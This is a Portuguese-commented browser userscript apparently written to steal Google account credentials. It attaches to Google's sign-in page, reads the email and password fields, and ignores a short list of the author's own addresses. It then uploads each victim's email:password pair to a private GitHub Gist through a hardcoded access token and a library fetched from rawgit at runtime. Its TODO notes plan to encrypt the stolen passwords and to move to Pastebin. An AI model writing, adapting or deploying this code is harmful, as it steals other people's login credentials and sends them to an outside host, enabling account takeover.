// ==UserScript==
// @name            testeCreateGist
// @description     precisa: OAuth para o Gist, API externa; não realmente privados.
// @namespace       https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
// @author          Micael Levi
// @locale          pt-br
// @include         *://accounts.google.com/ServiceLogin?*
// @include         *://accounts.google.com/signin*
// @version         1.04-2
// @grant           none
// ==/UserScript==

//	FIXME    só detecta a partir do segundo movimento
//	FIXME    não criar novo Gist, apenas alterar (acrescentar arquivo?)
//	FIXME    salvar somente ao submeter senha (adciona-lá ao conteudo do gist),	ou fazer download (ao inves de POST) http://danml.com/download.html,			@require http://danml.com/js/download.js
//
//	TODO     como usar o @require para utilizar um API externa.
//	TODO     criptografar senha antes de dar o patch
//	TODO     identificar ENTER
//	TODO     ao finalizar este, migrar com a mesma ideia, para o Pastebin que posta realmente privado.



// ignora tais prefixos de email:
const GIST_USERNAME = "micalevisk";
const PERSONAL_ACCESS_TOKEN = "<OAUTHGIST>";

const IGNORAR = [ "mllc", "terminatorredapb" ];
var user_especs = new USERSET(null,null,false);


////////////////////////////////////////////////////////
function USERSET(email, senha, flag){
    this.email = email;
    this.senha = senha;
    this.flag  = flag; // true: ja foi postado.
}
USERSET.prototype.toString = function(){
    return this.email + ':' + this.senha;
};


String.prototype.normalizar = function(){
    return this.replace(/^\d$/i, "0$&");
};

function getDateAndHour(){
    var today = new Date();
    var dd = today.getDate();
    var mm = today.getMonth()+1;
    var yyyy = today.getFullYear();
    var HH = today.getHours();
    var MM = today.getMinutes();

    dd = dd.toString().normalizar();
    mm = mm.toString().normalizar();
    HH = HH.toString().normalizar();
    MM = MM.toString().normalizar();

    today = `[${mm}/${dd}/${yyyy} - ${HH}:${MM}]`;

    return today;
}
////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////
Array.prototype.contemEmail = function ( emailstr ) {
    dominio = emailstr.replace(/^([^@]+)@.+$/i, "$1").trim();
    return (this.indexOf(dominio) > -1);
};
///////////////////////////////////////////////////////////



/**
 * Inicia a API Gistachio (c) https://github.com/stuartpb/gistachio.
 * @param {String} id	- A id no objeto script que será criado.
 * @param {Boolean} confirmar	- Se for 'true', exibe uma mensagem no console após inserir.
 */
function initgistachioAPI(id, confirmar){
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://rawgit.com/stuartpb/gistachio/master/gistachio.js'; // @require ou @resource
    if(id) script.id  = id;
    document.head.appendChild(script);

    if(confirmar)
    console.info("inserido!");
}


/**
 * Cria e posta um gist no http://gits.github.com
 * @param {USERSET}	conteudo - O conteúdo do gist.
 * @param {String}	filenmae - O nome do arquivo no gist.
 * @param {String}	filedescription - A descrição do gist.
 * @param {String}	oauthgist - Dat code.
 * @return {Boolean} - Criado com sucesso.
 */
function postit(conteudo, filename, filedescription, oauthgist){
    if(!conteudo || !filename) return false;

    conteudo = getDateAndHour() + '\n' + conteudo.toString();

    console.info("PREVIEW:");
    console.log(conteudo);

    var newfile = { fileName: { content: conteudo } };
    var optsnew = {
    accessToken: oauthgist,
    description: filedescription,
    public: false
    };

    var showResult = function(e, gistid){
    if(e) user_especs.flag = false;
    else{
        user_especs.flag = true;

        linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;
        console.log(linkresult);
        console.info(gistid);
    }
    };

    window.gistachio.postFiles(newfile, optsnew, showResult);

    return user_especs.flag;
}




///////////////////////// [ ALTERAR ESTA ] /////////////////////////
function GM_main(){
    var formulario = document.querySelector('form#gaia_loginform');

    //   document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
    //   });

    document.getElementById('signIn').onmouseover = function () {

        password = formulario.Passwd;
        loginmail= formulario.Email;

        if(typeof password !== 'undefined'){
          if(user_especs.email){
            user_especs.senha = password.value;

            if((!user_especs.flag) && (user_especs.senha) && (user_especs.senha.length >= 6))
          		postit(user_especs,
                'teste bitch please conteúdo',
                'descrição do gist',
                PERSONAL_ACCESS_TOKEN);
          }
        }

        if(typeof loginmail !== 'undefined'){
            emailcurr = loginmail.value;

            if(!IGNORAR.contemEmail(emailcurr))
                user_especs.email = emailcurr;
        }

    };
}




///////////////////////////////// [ MAIN ] ////////////////////////////////
if(document.getElementById('meulog') === null) initgistachioAPI('meulog', true);

window.addEventListener ("load", GM_main, false);
